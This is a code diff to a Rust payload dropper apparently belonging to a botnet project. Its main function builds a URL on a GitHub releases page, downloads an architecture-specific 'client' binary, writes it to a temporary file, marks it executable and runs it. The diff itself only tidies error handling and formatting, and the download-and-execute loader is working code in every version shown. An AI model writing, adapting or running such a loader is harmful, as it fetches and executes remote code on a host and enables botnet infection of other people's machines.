@@ -1,14 +1,18 @@
 use std::{io::Write, path::Path, process::Command};
 
 const ARCH: &'static str = std::env::consts::ARCH;
-const REPO: &'static str =
-    "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
+const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
 const PAYLOAD: &'static str = "client";
 
 /// Spawns a tasks and runs the payload
 fn drop(path: &Path) {
     println!("[+] Dropping payload {:?}", path.to_str());
-    Command::new(path).spawn().unwrap().wait().unwrap();
+    if let Err(e) = Command::new(path)
+        .spawn()
+        .and_then(|mut child| child.wait())
+    {
+        eprintln!("[-] Failed to execute payload: {}", e);
+    }
 }
 
 fn main() {
@@ -24,13 +28,12 @@ fn main() {
     let url = format!("{}/{}-{}", REPO, PAYLOAD, ARCH);
     println!("[+] Getting payload from: {}", url);
 
-    let response = client
-        .get(url)
-        .send();
+    let response = client.get(url).send();
 
     let payload = response.expect("Error retrieving payload");
 
     let mut temp_file = tempfile::NamedTempFile::new().expect("Failed to create a temporary file");
+
     temp_file
         .write_all(&payload.bytes().unwrap())
         .expect("Failed to write payload to file");
@@ -45,5 +48,7 @@ fn main() {
         std::fs::set_permissions(temp_file.path(), perms).unwrap();
     }
 
-    drop(temp_file.path());
+    let path = temp_file.into_temp_path();
+
+    drop(path.as_ref());
 }
